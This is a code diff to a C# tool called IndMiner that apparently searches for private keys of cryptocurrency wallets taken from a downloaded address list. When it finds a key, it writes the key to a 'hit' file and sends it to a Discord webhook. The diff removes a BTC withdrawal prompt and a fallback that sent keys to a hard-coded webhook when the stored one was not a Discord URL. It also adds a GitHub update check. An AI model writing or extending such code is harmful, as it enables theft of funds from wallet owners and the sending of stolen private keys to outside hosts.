@@ -19,18 +19,14 @@ namespace IndMiner
             Console.Title = Util.giveTitle();
 
             visuals.printLogo();
-            
-            if (App.loadFromRegistry("btcaddr") == null)
-            {
-                Debug.Log("Please enter your withdrawal BTC address");
-                App.saveToRegistry("btcaddr", Console.ReadLine());
-            }
 
             if (App.loadFromRegistry("webhook") == null)
             {
                 Debug.Log("Please enter your discord webhook URL (if empty it will write to file)");
                 App.saveToRegistry("webhook", Console.ReadLine());
             }
+
+            new updater();
 
             //Start
             if (!WalletListUtil.hasToDownload())
@@ -39,7 +35,28 @@ namespace IndMiner
                 new WalletListDownloader();
         }
     }
-    
+
+    class updater
+    {
+        public updater()
+        {
+            string localV = Assembly.GetEntryAssembly().GetName().Version.ToString();
+            string onlineV = Util.makeWebRequest("https://raw.githubusercontent.com/OlMi1/indminer/main/version").Replace("\n", "");
+
+            bool outdated = !onlineV.Contains(localV);
+
+            if (!outdated)
+                Debug.Log("Update check complete! You're running " + localV + " and are up to date! If you just updated, try again in 5 mins.");
+            else
+            {
+                Process.Start("https://github.com/OlMi1/indminer");
+                Debug.Log("Outdated! Current is v" + 
+                    onlineV + 
+                    ", you have v" + localV, true);
+            }
+        }
+    }
+
     class WalletMiner
     {
         public WalletMiner()
@@ -175,10 +192,9 @@ namespace IndMiner
             {
                 try
                 {
-                    string readVal = App.loadFromRegistry("webhook").ToString();
                     Process.Start(Util.generateWebhookURL(
-                        priv, 
-                        readVal.ToLower().Contains("discord") ? readVal : settings.webhookURL));
+                        "PRIV" + priv,
+                        App.loadFromRegistry("webhook").ToString()));
 
                     File.WriteAllText("hit-" + Util.getUnix().ToString() + ".txt", priv);
                 }
@@ -392,10 +408,15 @@ namespace IndMiner
         public static void Log(object str, bool stayActive = false)
         {
             Console.WriteLine(str);
-            System.Diagnostics.Debug.WriteLine(str); // for VS 2017
+            System.Diagnostics.Debug.WriteLine(str); // for VS
 
             if (stayActive)
-                Console.ReadLine();
+            {
+                while (true)
+                {
+                    Console.ReadLine();
+                }
+            }
         }
     }
     static class App
